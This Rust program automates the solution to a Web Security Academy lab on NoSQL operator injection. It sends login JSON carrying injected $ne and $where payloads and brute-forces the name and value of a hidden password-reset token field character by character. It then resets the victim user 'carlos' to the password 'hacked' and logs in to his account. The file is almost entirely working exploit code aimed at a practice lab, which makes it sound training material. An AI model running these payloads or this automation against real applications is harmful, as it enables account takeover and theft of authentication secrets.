/***************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 5/10/2023
*
* Lab: Exploiting NoSQL operator injection to extract unknown fields
*
* Steps: 1. Fetch the forgot-password page
*        2. Extract csrf token and session cookie
*        3. Make a forgot-password request for carlos
*        4. Inject an operator and payload into the login JSON object to determine
*           the length of the unknown field name
*        5. Modify the payload to brute force the field name
*        6. Modify the payload to determine the length of the field value
*        7. Modify the payload to brute force the field value
*        8. Fetch the forgot-password page with the field name and its value
*           as a query pararmeter
*        9. Extract csrf token and session cookie
*        10. Make a reset password request for carlos
*        11. Login as carlos with the new password
*        12. Fetch the carlos profile
*
****************************************************************************************/
#![allow(unused)]
/***********
 * Imports
 ***********/
use lazy_static::lazy_static;
use rayon::prelude::{IntoParallelRefIterator, ParallelIterator};
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::{self, HeaderMap},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc, Mutex,
    },
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Global variables
*******************/
lazy_static! {
    static ref CORRECT_FIELD_NAME: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref CORRECT_FIELD_VALUE: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref CORRECT_FIELD_NAME_CHARS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref CORRECT_FIELD_VALUE_CHARS_COUNTER: AtomicUsize = AtomicUsize::new(0);
}

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a53009803457b7a836ece2200080030.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "âŸª#âŸ« Injection point:".blue(),
        "login JSON object".yellow()
    );
    print!("{}", "â¦—1â¦˜ Fetching the forgot-password page.. ".white(),);
    io::stdout().flush();

    // fetch the forgot-password page
    let mut forgot_password_page =
        client
            .get(format!("{url}/forgot-password"))
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the forgot-password page".red()
            ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "â¦—2â¦˜ Extracting csrf token and session cookie.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_session_cookie(forgot_password_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract csrf token
    let mut csrf = extract_csrf(forgot_password_page)
        .expect(&format!("{}", "[!] Failed to extract csrf token".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "â¦—3â¦˜ Sending a reset password request for carlos.. ".white(),
    );
    io::stdout().flush();

    // make a forgot-password request for carlos
    client
        .post(format!("{url}/forgot-password"))
        .form(&HashMap::from([("username", "carlos"), ("csrf", &csrf)]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to make the forgot-password request for carlos".red()
        ));

    println!("{}", "OK".green());

    // determine the 3rd field length
    let field_name_length = determine_length(&client, url, "");

    // update the length of the CORRECT_FIELD_NAME variable length
    CORRECT_FIELD_NAME
        .lock()
        .unwrap()
        .push_str(&" ".repeat(field_name_length));

    // build the ranges
    // every range will be used in a different thread
    let mut ranges = build_ranges(0, field_name_length as i32, 8);

    // brute force the 3rd field name
    brute_force(&client, url, ranges, "", field_name_length);

    // get the value of the field name after brute forcing
    let field_name = CORRECT_FIELD_NAME.lock().unwrap();

    // determine the 3rd field value length
    let field_value_length = determine_length(&client, url, &field_name);

    // update the length of the CORRECT_FIELD_VALUE variable length
    CORRECT_FIELD_VALUE
        .lock()
        .unwrap()
        .push_str(&" ".repeat(field_value_length));

    // build the ranges
    // every range will be used in a different thread
    ranges = build_ranges(0, field_value_length as i32, 8);

    // brute force the 3rd field value
    brute_force(&client, url, ranges, &field_name, field_value_length);

    // get the value of the field name after brute forcing
    let field_value = CORRECT_FIELD_VALUE.lock().unwrap();

    print!(
        "{}",
        "\nâ¦—8â¦˜ Fetching the forgot-password page with the field name and its value as a query pararmter.. ".white()
    );
    io::stdout().flush();

    // fetch the forgot-password page with the extracted field name and its value as a query parameter
    forgot_password_page = client
        .get(format!("{url}/forgot-password?{field_name}={field_value}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the forgot-password page with the extracted field name and its value as a query parameter".red()
        ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "â¦—9â¦˜ Extracting csrf token and session cookie.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    session = extract_session_cookie(forgot_password_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract csrf token
    csrf = extract_csrf(forgot_password_page)
        .expect(&format!("{}", "[!] Failed to extract csrf token".red()));

    println!("{}", "OK".green());

    // set new password
    // change this to what you want
    let new_password = "hacked";

    print!(
        "{} {}.. ",
        "â¦—10â¦˜ Reseting carlos password to".white(),
        new_password.blue()
    );
    io::stdout().flush();

    // reset carlos password
    client
        .post(format!("{url}/forgot-password"))
        .form(&HashMap::from([
            ("csrf", csrf),
            (&field_name, field_value.to_owned()),
            ("new-password-1", new_password.to_string()),
            ("new-password-2", new_password.to_string()),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to reset carlos password".red()));

    println!("{}", "OK".green());
    print!("{}", "â¦—11â¦˜ Logging in as the carlos.. ".white(),);
    io::stdout().flush();

    // correct credentials of carlos
    let data = format!(
        r###"
    {{
        "username": "carlos",
        "password": "{new_password}"
    }}
        "###
    );

    // login as the carlos
    let carlos_login = client
        .post(format!("{url}/login"))
        .header("Content-Type", "application/json")
        .body(data)
        .send()
        .expect(&format!("{}", "[!] Failed to login as carlos".red()));

    // extract carlos session cookie
    session = extract_session_cookie(carlos_login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    println!("{}", "OK".green());
    print!("{}", "â¦—12â¦˜ Fetching the carlos profile.. ".white(),);
    io::stdout().flush();

    // fetch carlos page
    let carlos = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch carlos profile".red()));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "ðŸ—¹ Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*****************************************
* Function used to build a set of ranges
* Every range will be used in one thread
******************************************/
fn build_ranges(start: i32, end: i32, number_of_ranges: i32) -> Vec<Vec<i32>> {
    (start..end)
        .collect::<Vec<i32>>()
        .chunks(number_of_ranges as usize)
        .map(|x| x.to_owned())
        .collect::<Vec<Vec<i32>>>()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/*******************************************
* Function to extract a pattern form a text
********************************************/
fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.find(text) {
        Some(text.as_str().to_string())
    } else {
        None
    }
}

/**********************************
* Function to determine length
***********************************/
fn determine_length(client: &Client, url: &str, field_name: &str) -> usize {
    // the variable that will updated with correct length
    let mut length = 0;

    // some output formatting based on which step you are in
    match field_name {
        "" => (),
        _ => println!(""),
    }

    for i in 1..50 {
        // print information based on which step you are in
        match field_name {
            "" => {
                print!(
                    "\r{} {} {} {}",
                    "â¦—4â¦˜ Checking if field number".white(),
                    "3".to_string().blue(),
                    "length = ",
                    i.to_string().yellow()
                );
            }
            _ => {
                print!(
                    "\r{} {} {} {}",
                    "â¦—6â¦˜ Checking if the field".white(),
                    field_name.to_string().blue(),
                    "length = ",
                    i.to_string().yellow()
                );
            }
        }
        io::stdout().flush();

        // payload to determine the length
        let mut payload = String::new();

        // set the payload based on which step you are in
        // "" means that you determine the length of the field name
        // _ means that you determine the length of the field value
        match field_name {
            "" => {
                payload = format!(
                    r###"
                {{
                    "username": "carlos",
                    "password": {{
                        "$ne": ""
                    }},
                    "$where": "Object.keys(this)[3].length == {i}"
                }}
                "###
                );
            }
            _ => {
                payload = format!(
                    r###"
                {{
                    "username": "carlos",
                    "password": {{
                        "$ne": ""
                    }},
                    "$where": "this.{field_name}.length == {i}"
                }}
                "###
                );
            }
        }

        // fetch the page with the injected payload
        let injection = client
            .post(format!("{url}/login"))
            .header("Content-Type", "application/json")
            .body(payload)
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload to determine field length"
                    .red()
            ));

        // extract the error message from the response body
        let body = injection.text().unwrap();
        let error_text = extract_pattern("Invalid username or password", &body);

        // if the error message is not returned in the response
        if error_text.is_none() {
            println!(
                " [ {} {} ]",
                "Correct length:".white(),
                i.to_string().green().bold()
            );

            // correct length
            length = i;

            break;
        } else {
            continue;
        }
    }

    // return the correct length
    length
}

/***********************************
* Function to brute force password
************************************/
fn brute_force(client: &Client, url: &str, ranges: Vec<Vec<i32>>, field_name: &str, length: usize) {
    // run every range in a different thread
    ranges.par_iter().for_each(|range| {
        // iterate over every element in every range
        for position in range {
            // iterate over possible chars
            for character in
                "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".chars()
            {
                // print information based on which step you are in
                match field_name {
                    "" => {
                        print!(
                            "\r{} {} {} {} {} {}",
                            "â¦—5â¦˜ Checking if the char of field".white(),
                            "3".to_string().blue(),
                            "at position".white(),
                            position.to_string().blue(),
                            " = ".white(),
                            character.to_string().yellow()
                        );
                    }
                    _ => {
                        print!(
                            "\r{} {} {} {} {} {}",
                            "â¦—7â¦˜ Checking if the char of".white(),
                            field_name.to_string().blue(),
                            "at position".white(),
                            position.to_string().blue(),
                            " = ".white(),
                            character.to_string().yellow()
                        );
                    }
                }
                io::stdout().flush();

                // payload to brute force
                let mut payload = String::new();

                // set the payload based on which step you are in
                // "" means that you brute force the field name
                // _ means that you brute force the field value
                match field_name {
                    "" => {
                        payload = format!(
                            r###"
                    {{
                        "username": "carlos",
                        "password": {{
                            "$ne": ""
                        }},
                        "$where": "Object.keys(this)[3][{position}] == '{character}'"
                    }}
                    "###
                        );
                    }
                    _ => {
                        payload = format!(
                            r###"
                    {{
                        "username": "carlos",
                        "password": {{
                            "$ne": ""
                        }},
                        "$where": "this.{field_name}[{position}] == '{character}'"
                    }}
                    "###
                        );
                    }
                }

                // fetch the page with the injected payload
                let injection = client
                    .post(format!("{url}/login"))
                    .header("Content-Type", "application/json")
                    .body(payload)
                    .send()
                    .expect(&format!(
                        "{}",
                        "[!] Failed to fetch the page with the injected payload to brute force field name"
                            .red()
                    ));

                // extract the error message from the response body
                let body = injection.text().unwrap();
                let error_text = extract_pattern("Invalid username or password", &body);

                // if the error message is not returned in the response
                if error_text.is_none() {
                    // set the payload based on which step you are in
                    // "" means that you brute force the field name
                    // _ means that you brute force the field value
                    match field_name {
                        "" => {
                            // update the coutner
                            CORRECT_FIELD_NAME_CHARS_COUNTER.fetch_add(1, Ordering::Relaxed);
                            
                            // update the field name with the found char
                            CORRECT_FIELD_NAME.lock().unwrap().replace_range(
                                *position as usize..*position as usize + 1,
                                &character.to_string(),
                            );

                            print!(
                                " ({}%): {}",
                                ((CORRECT_FIELD_NAME_CHARS_COUNTER.fetch_add(0, Ordering::Relaxed) as f32 / length as f32)
                                * 100.0) as i32,
                                CORRECT_FIELD_NAME.lock().unwrap().green().bold()
                            );
                        },
                        _ => {
                            // update the coutner
                            CORRECT_FIELD_VALUE_CHARS_COUNTER.fetch_add(1, Ordering::Relaxed);
                            
                            // update the field value with the found char
                            CORRECT_FIELD_VALUE.lock().unwrap().replace_range(
                                *position as usize..*position as usize + 1,
                                &character.to_string(),
                            );

                            print!(
                                " ({}%): {}",
                                ((CORRECT_FIELD_VALUE_CHARS_COUNTER.fetch_add(0, Ordering::Relaxed) as f32 / length as f32 )
                                * 100.0) as i32,
                                CORRECT_FIELD_VALUE.lock().unwrap().green().bold()
                            );
                        }
                    }
                    break;
                } else {
                    continue;
                }
            }
        }
    })
}
